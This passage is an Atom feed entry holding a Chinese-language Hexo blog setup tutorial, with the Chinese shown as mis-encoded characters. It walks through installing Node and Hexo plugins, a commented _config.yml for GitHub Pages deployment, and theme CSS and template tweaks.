class="line"></span><br><span class="line"><span class="comment">#ä½¿ç”¨ ./configure åˆ›å»ºç¼–è¯‘æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§ï¼š</span></span><br><span class="line">$ <span class="built_in">cd</span> node</span><br><span class="line">$ sudo ./configure</span><br><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹ node ç‰ˆæœ¬ï¼š</span></span><br><span class="line">$ node --version</span><br><span class="line">v11.1.0</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p><a href="/2018/07/24/git-config/">å¦ä¸€ç‰‡æ–‡ç« </a></p><h2 id="å®‰è£…hexo"><a href="#å®‰è£…hexo" class="headerlink" title="å®‰è£…hexo"></a>å®‰è£…hexo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="åˆ›å»ºç½‘ç«™æ–‡ä»¶"><a href="#åˆ›å»ºç½‘ç«™æ–‡ä»¶" class="headerlink" title="åˆ›å»ºç½‘ç«™æ–‡ä»¶"></a>åˆ›å»ºç½‘ç«™æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir blog</span><br><span class="line"><span class="comment"># åˆå§‹åŒ–</span></span><br><span class="line">$ hexo init blog &amp;&amp; <span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…hexoæ’ä»¶"><a href="#å®‰è£…hexoæ’ä»¶" class="headerlink" title="å®‰è£…hexoæ’ä»¶"></a>å®‰è£…hexoæ’ä»¶</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line">$ npm install hexo-asset-image --save</span><br><span class="line"><span class="comment"># Rss</span></span><br><span class="line">$ npm install hexo-generator-feed --save</span><br><span class="line"><span class="comment"># sitemap</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save</span><br><span class="line">$ npm install hexo-generator-baidu-sitemap --save</span><br><span class="line"></span><br><span class="line">$ npm install hexo-renderer-pug --save</span><br><span class="line">$ npm install hexo-renderer-sass --save</span><br><span class="line"><span class="comment">#æœç´¢æ’ä»¶</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"><span class="comment"># ç”Ÿæˆ SSH å…¬é’¥å’Œå¯†é’¥ é»˜è®¤ç”Ÿæˆåœ¨æ ¹ç›®å½•çš„.sshæ–‡ä»¶å¤¹ä¸‹ ~/.ssh</span></span><br><span class="line">$ ssh-keygen -t rsa </span><br><span class="line"><span class="comment"># æµ‹è¯• (å‚æ•° -v è¿›å…¥debugæ¨¡å¼)</span></span><br><span class="line">$ ssh -t git@github.com </span><br><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h2 id="ç½‘ç«™é…ç½®æ–‡ä»¶"><a href="#ç½‘ç«™é…ç½®æ–‡ä»¶" class="headerlink" title="ç½‘ç«™é…ç½®æ–‡ä»¶"></a>ç½‘ç«™é…ç½®æ–‡ä»¶</h2><ul><li>é…ç½®æ–‡ä»¶å­˜å‚¨ä½ç½®:blog/_config.yml<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration Hexoé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘ç«™ä¿¡æ¯</span></span><br><span class="line"><span class="comment"># æ ‡é¢˜</span></span><br><span class="line">title: xx</span><br><span class="line"><span class="comment"># å‰¯æ ‡é¢˜</span></span><br><span class="line">subtitle: xx</span><br><span class="line"><span class="comment"># åšå®¢æè¿°</span></span><br><span class="line">description: </span><br><span class="line"><span class="comment"># ä½œè€…æ˜µç§°</span></span><br><span class="line">author: xx</span><br><span class="line"><span class="comment"># ç½‘ç«™è¯­è¨€ï¼Œé»˜è®¤è‹±è¯­ï¼Œè®¾ç½®ç®€ä½“æ±‰è¯­</span></span><br><span class="line">language: zh-CN</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¶åŒºï¼Œé»˜è®¤ç”µè„‘æ—¶åŒº</span></span><br><span class="line">timezone: Asia/Shanghai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç½‘å€è®¾ç½®</span></span><br><span class="line"><span class="comment"># å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†urlè®¾ç½®æˆ'http://yoursite.com/child'ï¼Œå°†rootè®¾ç½®æˆ'/child/'</span></span><br><span class="line"><span class="comment"># ç½‘å€</span></span><br><span class="line">url: https://xx.github.io</span><br><span class="line"><span class="comment"># ç½‘ç«™æ ¹ç›®å½•ã€‚å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†rootè®¾ç½®æˆ'å­ç›®å½•å'</span></span><br><span class="line">root: /</span><br><span class="line"><span class="comment"># æ–‡ç« é“¾æ¥åœ°å€æ ¼å¼ ã€‚å³æ–‡ç« å­˜æ”¾çš„ç›®å½•ã€‚</span></span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®å½•è®¾ç½®</span></span><br><span class="line"><span class="comment"># èµ„æºæ–‡ä»¶å¤¹ï¼Œæ”¾åœ¨é‡Œé¢çš„æ–‡ä»¶ä¼šä¸Šä¼ åˆ°githubä¸­</span></span><br><span class="line">source_dir: <span class="built_in">source</span></span><br><span class="line"><span class="comment"># å…¬å…±æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ç”Ÿæˆçš„é™æ€æ–‡ä»¶</span></span><br><span class="line">public_dir: public</span><br><span class="line"><span class="comment"># æ ‡ç­¾æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯tagsã€‚å®é™…å­˜æ”¾åœ¨source/tagsä¸­ã€‚</span></span><br><span class="line">tag_dir: tags</span><br><span class="line">rss_dir: rss</span><br><span class="line"><span class="comment"># æ¡£æ¡ˆæ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯archivesã€‚</span></span><br><span class="line">archive_dir: archives</span><br><span class="line"><span class="comment"># åˆ†ç±»æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯categoriesã€‚å®é™…å­˜æ”¾åœ¨source/categoriesä¸­ã€‚</span></span><br><span class="line">category_dir: categories</span><br><span class="line"><span class="comment"># ä»£ç æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯downloads/code</span></span><br><span class="line">code_dir: downloads/code</span><br><span class="line"><span class="comment"># å›½é™…åŒ–æ–‡ä»¶å¤¹ï¼Œé»˜è®¤è·Ÿlanguageç›¸åŒ</span></span><br><span class="line">i18n_dir: :lang</span><br><span class="line"><span class="comment"># ä¸éœ€è¦æ¸²æŸ“çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å¤¹,æ”¾åœ¨[]ä¸­</span></span><br><span class="line"><span class="comment"># è¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ç™¾åº¦å’Œgoogleçš„ç«™é•¿éªŒè¯æ–‡ä»¶ï¼Œä¸èƒ½æ¸²æŸ“ï¼Œå¦åˆ™ä¼šæ”¹å˜å†…å®¹ï¼Œä¸èƒ½éªŒè¯è¿‡</span></span><br><span class="line">skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, æ¨¡æ¿.md]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™ä½œé€‰é¡¹</span></span><br><span class="line"><span class="comment"># æ–°å»ºåšæ–‡ï¼ˆå¸–å­ï¼‰çš„é»˜è®¤åç§°</span></span><br><span class="line"><span class="comment"># File name of new posts</span></span><br><span class="line">new_post_name: :title.md </span><br><span class="line"><span class="comment"># é»˜è®¤å¸ƒå±€æ¨¡æ¿æ˜¯postï¼Œè€Œä¸æ˜¯draftå’Œpage</span></span><br><span class="line">default_layout: post</span><br><span class="line"><span class="comment"># æ˜¯å¦å°†æ ‡é¢˜è½¬æ¢æˆæ ‡é¢˜å½¢å¼ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰</span></span><br><span class="line">titlecase: <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="comment"># åœ¨æ–°æ ‡ç­¾é¡µé¢ä¸­æ‰“å¼€ç½‘é¡µ</span></span><br><span class="line">external_link: <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">filename_case: 0</span><br><span class="line"><span class="comment"># æ˜¯å¦æ¸²æŸ“è‰ç¨¿</span></span><br><span class="line">render_drafts: <span class="literal">false</span></span><br><span class="line"><span class="comment"># å¯åŠ¨ Asset æ–‡ä»¶å¤¹</span></span><br><span class="line">post_asset_folder: <span class="literal">false</span></span><br><span class="line"><span class="comment"># æŠŠé“¾æ¥æ”¹ä¸ºä¸æ ¹ç›®å½•çš„ç›¸å¯¹ä½å€</span></span><br><span class="line">relative_link: <span class="literal">false</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºæœªæ¥çš„æ–‡ç« </span></span><br><span class="line">future: <span class="literal">true</span></span><br><span class="line"><span class="comment"># ä»£ç å—çš„è®¾ç½®</span></span><br><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span>          <span class="comment">#  ä½¿ç”¨ä»£ç é«˜äº®</span></span><br><span class="line">  line_number: <span class="literal">true</span> <span class="comment"># æ˜¾ç¤ºè¡Œå·</span></span><br><span class="line">  auto_detect: <span class="literal">true</span>  <span class="comment"># è‡ªåŠ¨æ£€æµ‹è¯­è¨€</span></span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†ç±»å’Œæ ‡ç­¾</span></span><br><span class="line"><span class="comment"># é»˜è®¤åˆ†ç±»</span></span><br><span class="line">default_category: uncategorized</span><br><span class="line"><span class="comment"># åˆ†ç±»åˆ«å</span></span><br><span class="line">category_map:</span><br><span class="line"><span class="comment"># æ ‡ç­¾åˆ«å</span></span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ—¥æœŸå’Œæ—¶é—´æ ¼å¼</span></span><br><span class="line"><span class="comment"># Hexo ä½¿ç”¨ Moment.js æ¥è§£æå’Œæ˜¾ç¤ºæ—¶é—´ã€‚</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†é¡µé…ç½®</span></span><br><span class="line"><span class="comment"># ---------------ä¸‹é¢é€‰é¡¹éœ€è¦å¯¹åº”æ’ä»¶çš„æ”¯æŒ---------------</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-index --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-archive --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-category --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-tag --save</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="comment"># æ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« é‡ </span></span><br><span class="line"><span class="comment"># per_page: 20</span></span><br><span class="line"><span class="comment"># é¦–é¡µçš„åˆ†é¡µè®¾ç½®</span></span><br><span class="line">index_generator:</span><br><span class="line">  per_page: 5</span><br><span class="line"><span class="comment"># å½’æ¡£é¡µçš„åˆ†é¡µè®¾ç½®</span></span><br><span class="line">archive_generator:</span><br><span class="line">  per_page: 30</span><br><span class="line">  yearly: <span class="literal">true</span></span><br><span class="line">  monthly: <span class="literal">true</span></span><br><span class="line"><span class="comment"># æ ‡ç­¾é¡µçš„åˆ†é¡µè®¾ç½®</span></span><br><span class="line">tag_generator:</span><br><span class="line">  per_page: 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†é¡µè·¯å¾„ï¼Œåœ¨publicä¸­å¯ä»¥çœ‹åˆ°</span></span><br><span class="line"><span class="comment"># pagination_dir: page</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions æ‹“å±•æ’ä»¶é…ç½®</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line">plugins: </span><br><span class="line">baidusitemap: </span><br><span class="line">  path: baidusitemap.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®RSS</span></span><br><span class="line">feed: </span><br><span class="line">  <span class="comment"># feed ç±»å‹ (atom/rss2)</span></span><br><span class="line">  <span class="built_in">type</span>: atom   </span><br><span class="line">  <span class="comment"># rss è·¯å¾„</span></span><br><span class="line">  path: atom.xml  </span><br><span class="line">  <span class="comment"># åœ¨ rss ä¸­æœ€å¤šç”Ÿæˆçš„æ–‡ç« æ•°(0æ˜¾ç¤ºæ‰€æœ‰)</span></span><br><span class="line">  <span class="built_in">limit</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ç«™ç‚¹å†…å®¹æœç´¢</span></span><br><span class="line"><span class="comment"># éœ€è¦å…ˆå®‰è£…æ’ä»¶ï¼š</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-search --save</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  <span class="comment"># å¦‚åªæƒ³ç´¢å¼•æ–‡ç« ï¼Œå¯è®¾ç½®ä¸ºpost</span></span><br><span class="line">  field: all </span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»é¢˜é…ç½®</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: maupassant</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨ç½²é…ç½®</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># éƒ¨ç½²åˆ°github</span></span><br><span class="line">  repository: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">  <span class="comment"># åˆ†æ”¯é»˜è®¤master</span></span><br><span class="line">  branch: maste</span><br></pre></td></tr></table></figure></li></ul><h2 id="ä¸»é¢˜ç¾åŒ–"><a href="#ä¸»é¢˜ç¾åŒ–" class="headerlink" title="ä¸»é¢˜ç¾åŒ–"></a>ä¸»é¢˜ç¾åŒ–</h2><h3 id="ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦-å·çš„æ ‡ç­¾"><a href="#ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦-å·çš„æ ‡ç­¾" class="headerlink" title="ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦#å·çš„æ ‡ç­¾"></a>ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦#å·çš„æ ‡ç­¾</h3><p>ä¿®æ”¹æ¨¡æ¿/themes/next/layout/_macro/post.swig<br>æœç´¢ rel=â€tagâ€&gt;#ï¼Œå°† # æ¢æˆ <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h3 id="åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°"><a href="#åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°" class="headerlink" title="åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°"></a>åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°</h3><p>åœ¨è·¯å¾„ \themes\next\layout_macro ä¸­æ–°å»º passage-end-tag.swig æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;-------------æœ¬æ–‡ç»“æŸ,æ„Ÿè°¢æ‚¨çš„é˜…è¯»-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>æ¥ç€æ‰“å¼€\themes\next\layout_macro\post.swigæ–‡ä»¶<br>åœ¨post-body ä¹‹åï¼Œ post-footerä¹‹å‰æ·»åŠ <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">    &#123;% include <span class="string">'passage-end-tag.swig'</span> %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­æœ€ååŠ å…¥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ–‡ç« æœ«å°¾æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°</span></span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><h3 id="ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬"><a href="#ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬" class="headerlink" title="ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬"></a>ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬</h3><p>æ‰“å¼€\themes\next\source\css_common\components\sidebar\sidebar-author.styl<br>åœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: <span class="variable">$site</span>-author-image-padding;</span><br><span class="line">  max-width: <span class="variable">$site</span>-author-image-width;</span><br><span class="line">  height: <span class="variable">$site</span>-author-image-height;</span><br><span class="line">  border: <span class="variable">$site</span>-author-image-border-width solid <span class="variable">$site</span>-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  /* å¤´åƒåœ†å½¢ */</span><br><span class="line">  border-radius: 80px;</span><br><span class="line">  -webkit-border-radius: 80px;</span><br><span class="line">  -moz-border-radius: 80px;</span><br><span class="line">  box-shadow: inset 0 -1px 0 <span class="comment">#333sf;</span></span><br><span class="line"></span><br><span class="line">  /* è®¾ç½®å¾ªç¯åŠ¨ç”» [animation: (play)åŠ¨ç”»åç§° (2s)åŠ¨ç”»æ’­æ”¾æ—¶é•¿å•ä½ç§’æˆ–å¾®ç§’ (ase-out)åŠ¨ç”»æ’­æ”¾çš„é€Ÿåº¦æ›²çº¿ä¸ºä»¥ä½é€Ÿç»“æŸ </span><br><span class="line">    (1s)ç­‰å¾…1ç§’ç„¶åå¼€å§‹åŠ¨ç”» (1)åŠ¨ç”»æ’­æ”¾æ¬¡æ•°(infiniteä¸ºå¾ªç¯æ’­æ”¾) ]*/</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */</span><br><span class="line">  -webkit-transition: -webkit-transform 1.0s ease-out;</span><br><span class="line">  -moz-transition: -moz-transform 1.0s ease-out;</span><br><span class="line">  transition: transform 1.0s ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">  /* é¼ æ ‡ç»è¿‡åœæ­¢å¤´åƒæ—‹è½¬ </span><br><span class="line">  -webkit-animation-play-state:paused;</span><br><span class="line">  animation-play-state:paused;*/</span><br><span class="line"></span><br><span class="line">  /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */</span><br><span class="line">  -webkit-transform: rotateZ(360deg);</span><br><span class="line">  -moz-transform: rotateZ(360deg);</span><br><span class="line">  transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Z è½´æ—‹è½¬åŠ¨ç”» */</span><br><span class="line">@-webkit-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -moz-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -moz-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ"><a href="#ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ" class="headerlink" title="ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ"></a>ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ</h3><p>æ‰“å¼€\themes\next\source\css_custom\custom.styl,å‘é‡Œé¢åŠ å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://segmentfault.com/a/1190000009544924" target="_blank" rel="noopener">ç¾åŒ–å‚è€ƒæ–‡ç« </a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/07/24/hexo-config/hexo-config-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Hexoç®€ä»‹&quot;&gt;&lt;a href=&quot;#Hexoç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;Hexoç®€ä»‹&quot;&gt;&lt;/a&gt;Hexoç®€ä»‹&lt;/h2&gt;
    
    </summary>
    
      <category term="æ‚ä¸ƒæ‚å…«" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="hexo" scheme="https://t43wiu6.github.io/tags/hexo/"/>
    
  </entry>
  
</feed>
